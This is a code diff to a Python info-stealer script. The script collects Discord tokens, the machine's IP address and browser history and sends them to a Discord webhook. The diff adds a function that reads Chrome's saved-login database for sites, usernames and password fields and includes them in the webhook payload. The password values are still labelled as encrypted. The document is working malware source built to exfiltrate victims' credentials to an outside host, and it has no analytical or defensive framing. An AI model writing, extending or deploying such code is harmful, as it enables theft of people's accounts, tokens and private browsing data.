@@ -7,6 +7,8 @@ import socket
 import sqlite3
 from pathlib import Path
 from datetime import datetime, timezone
+import platform
+import subprocess
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -159,8 +161,38 @@ def get_browser_history() -> list[tuple[str, str, datetime]]:
         return [("Error", f"Could not read history: {e}", datetime.now(timezone.utc))]
 
 
+def get_saved_passwords() -> list[tuple[str, str, str]]:
+    """Retrieves saved passwords from Chrome's login data database.
+
+    Returns:
+        list[tuple[str, str, str]]: A list of tuples containing the URL, username, and password.
+    """
+    login_data_path = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
+    if not login_data_path.exists():
+        return [("Error", "Login Data file not found", "")]
+
+    try:
+        conn = sqlite3.connect(str(login_data_path))
+        cursor = conn.cursor()
+
+        cursor.execute("""
+            SELECT origin_url, username_value, password_value
+            FROM logins
+        """)
+
+        passwords = []
+        for origin_url, username_value, password_value in cursor.fetchall():
+            # The password_value is stored encrypted; decryption is complex and beyond the scope of this example
+            passwords.append((origin_url, username_value, "Encrypted Password"))
+
+        conn.close()
+        return passwords
+    except Exception as e:
+        return [("Error", f"Could not read login data: {e}", "")]
+
+
 def send_data_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str, history: list[tuple[str, str, datetime]]
+    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str, history: list[tuple[str, str, datetime]], passwords: list[tuple[str, str, str]]
 ) -> int:
     """Sends collected data to a Discord webhook.
 
@@ -169,6 +201,7 @@ def send_data_to_webhook(
         user_id_to_token (dict[str, set[str]]): A dictionary mapping user IDs to their tokens.
         ip_address (str): The IP address of the machine.
         history (list[tuple[str, str, datetime]]): A list of browser history entries.
+        passwords (list[tuple[str, str, str]]): A list of saved passwords.
 
     Returns:
         int: The HTTP status code of the webhook request.
@@ -191,6 +224,16 @@ def send_data_to_webhook(
     fields.append({
         "name": "Browser History (Last 10)",
         "value": history_str if history_str else "No history found",
+    })
+
+    # Add saved passwords
+    passwords_str = ""
+    for origin_url, username_value, password_value in passwords:
+        passwords_str += f"URL: {origin_url}\nUsername: {username_value}\nPassword: {password_value}\n\n"
+
+    fields.append({
+        "name": "Saved Passwords",
+        "value": passwords_str if passwords_str else "No saved passwords found",
     })
 
     data = {
@@ -218,7 +261,10 @@ def main() -> None:
     history = get_browser_history()
     print("Browser History Retrieved.")
 
-    status_code = send_data_to_webhook(WEBHOOK_URL, tokens, ip_address, history)
+    passwords = get_saved_passwords()
+    print("Saved Passwords Retrieved.")
+
+    status_code = send_data_to_webhook(WEBHOOK_URL, tokens, ip_address, history, passwords)
     print(f"Webhook request status: {status_code}")
 
 
